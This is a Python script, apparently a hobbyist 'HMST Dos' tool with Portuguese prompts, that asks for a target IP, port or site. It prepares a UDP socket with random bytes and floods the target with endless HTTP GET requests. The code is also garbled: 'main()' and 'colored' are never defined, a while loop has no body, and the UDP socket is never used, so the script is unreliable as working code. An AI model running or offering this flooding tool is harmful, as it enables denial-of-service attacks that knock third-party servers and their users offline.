import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##############

os.system ("clear")
os.system("figlet HMST Dos")
print
print ("Dono: Hamster")
print ("☠️")
print ("Instagram : @hamster.py")
print ("With great power comes great responsibility.")
ip = input("IP : ")
port  = input("Port IP   :")

os.system("clear")
os.system("figlet HMSTLOL")
print ("[+]--Carregando>                           [+]0% ")
time.sleep(5)
print ("[+]-- Carregando>                          [+]25% ")
time.sleep(5)
print ("[+]--Carregando>                          [+]50% ")
time.sleep(5)
print ("[+]--Carregando>                          [+]75% ")
print ("[+]--Carregando>                           [+]100% ")
time.sleep(5)
sent = 0
while True:
main()

import requests
def dos():

        s = input(colored("enter your target\n example: site.ir\n\n ~> ",'magenta'))

        r = requests.get("http://"+s)

        print(colored("\nPocket was sent",'red'))

        r = requests.get("http://"+s)

        print(colored("Enviado",'blue'))

        r = requests.get("http://"+s)

        print(colored("Enviado",'red'))

        r = requests.get("http://"+s)

        print(colored("Enviado",'blue'))

        c = input(colored("Continuar? y/n? ~> ",'yellow'))

        if c == 'y':
            while True:
                r = requests.get("http://"+s)
                print(colored("Enviadot", 'red'))
                r = requests.get("http://"+s)
                print(colored("Enviado", 'blue'))
        elif c == 'n':
            os.system('clear')
            main()
            dos()


dos()